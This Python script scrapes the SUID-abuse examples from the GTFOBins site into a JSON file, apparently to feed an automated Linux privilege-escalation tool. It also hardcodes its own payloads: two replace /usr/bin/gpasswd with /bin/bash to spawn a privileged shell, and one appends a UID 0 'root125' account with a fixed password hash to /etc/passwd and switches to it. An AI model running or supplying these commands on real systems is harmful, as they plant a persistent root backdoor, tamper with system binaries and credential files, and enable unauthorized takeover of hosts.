import json
import requests
from bs4 import BeautifulSoup

#######################################################################################
#######################################################################################
#######################################################################################

cp = """
cp /usr/bin/gpasswd /tmp/gpasswd.bac
cp /bin/bash /usr/bin/gpasswd
/usr/bin/gpasswd -p
"""

mv = """
cp /etc/passwd /tmp/passwd.bac
cp /etc/passwd /tmp/passwd.copy
echo 'root125:$6$XYve5DPaJ07W8hah$bUwkQVpAbuOpZNgL/EGbV55WPSKKWKr4fakGWHQJNDOkFCmSlEyZ7jwSgGAhhUeAiBYh8ceDSaJfGSyCS6gnU1:0:0:root:/root:/bin/bash' >> /tmp/passwd.copy
mv /tmp/passwd.copy /etc/passwd
su root125 # password
"""

tee = """
cp /usr/bin/gpasswd /tmp/gpasswd.bac
cat /bin/bash | tee /usr/bin/gpasswd
/usr/bin/gpasswd -p
"""

#######################################################################################
#######################################################################################
#######################################################################################

def getBinariesList():
  try:
    reqs = requests.get("https://gtfobins.github.io/")
    soup = BeautifulSoup(reqs.text, "html.parser")
  except:
    print("[-] Failed")
    exit(1)
  
  binariesList = []
  for link in soup.select("a.bin-name"):
    binary = link.text
    binariesList.append(binary)

  return binariesList

#######################################################################################
#######################################################################################
#######################################################################################

def clean(code):
  codeLines = [ line.strip() for line in code.split("\n") if line.strip() and "sudo" not in line ]
  return "\n".join(codeLines)

#######################################################################################
#######################################################################################
#######################################################################################

def getGtfobin(binary):
  if binary == "cp":
    return [ cp.strip() ]
  
  if binary == "mv":
    return [ mv.strip() ]

  if binary == "tee":
    return [ tee.strip() ]

  try:
    res = requests.get(f"https://gtfobins.github.io/gtfobins/{binary}/")
    if res.status_code != 200:
      return None

    soup = BeautifulSoup(res.text, "html.parser")
  except:
    return None

  h2List = soup.select("h2") 
  suidExamplesSectionIndex = -1
  for index in range(len(h2List)):
    if h2List[index].get("id").lower() == "suid":
      suidExamplesSectionIndex = index
      break
  else:
    return None
  
  scripts = []
  for code in soup.select(".examples")[suidExamplesSectionIndex].select("pre code"):
    scripts.append(clean(code.text))

  return scripts

#######################################################################################
#######################################################################################
#######################################################################################

def main():
  data = {}

  binariesList = getBinariesList()
  for binary in binariesList:
    scripts = getGtfobin(binary)
    if scripts:
      data[binary] = scripts
      print(binary)

  with open("data/gtfobins-suids-data.json", "w+") as f:
    f.write(json.dumps(data))

#######################################################################################
#######################################################################################
#######################################################################################

if __name__ == "__main__":
  main()
